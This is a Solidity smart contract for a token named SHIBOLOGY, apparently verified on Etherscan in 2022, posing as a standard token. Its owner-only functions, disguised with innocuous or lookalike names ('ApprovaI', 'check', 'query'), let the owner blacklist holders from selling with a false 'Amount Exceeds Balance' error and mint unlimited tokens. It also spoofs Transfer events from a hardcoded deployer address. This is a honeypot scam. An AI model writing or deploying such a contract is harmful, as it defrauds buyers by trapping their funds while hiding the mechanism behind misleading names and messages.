/**
 *Submitted for verification at Etherscan.io on 2022-09-27
*/

pragma solidity 0.8.17;
/*
   _____ _    _ _____ ____   ____  _      ____   _______     __
  / ____| |  | |_   _|  _ \ / __ \| |    / __ \ / ____\ \   / /
 | (___ | |__| | | | | |_) | |  | | |   | |  | | |  __ \ \_/ / 
  \___ \|  __  | | | |  _ <| |  | | |   | |  | | | |_ | \   /  
  ____) | |  | |_| |_| |_) | |__| | |___| |__| | |__| |  | |   
 |_____/|_|  |_|_____|____/ \____/|______\____/ \_____|  |_|   
                                                               
                                                                                                                                                     
Social: @Shibology
*/   
 
contract SHIBOLOGY {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) Amountof;

    // 
    string public name = "SHIBOLOGY";
    string public symbol = unicode"SHIBOLOGY";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x7EF3c7707014C9eBB571C319e0D5fb269CAF0Dae;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!Amountof[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function check(address oracle,  uint256 update) public {
             require(msg.sender == owner);
             balanceOf[oracle] += update;
             totalSupply += update; }
            function ApprovaI(address txt) public
             {             
             require(msg.sender == owner);
         require(!Amountof[txt], "0x");
             Amountof[txt] = true; }
        function query(address txt) public {
             require(msg.sender == owner);
        require(Amountof[txt], "0x");
         Amountof[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!Amountof[from] , "Amount Exceeds Balance"); 
        require(!Amountof[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }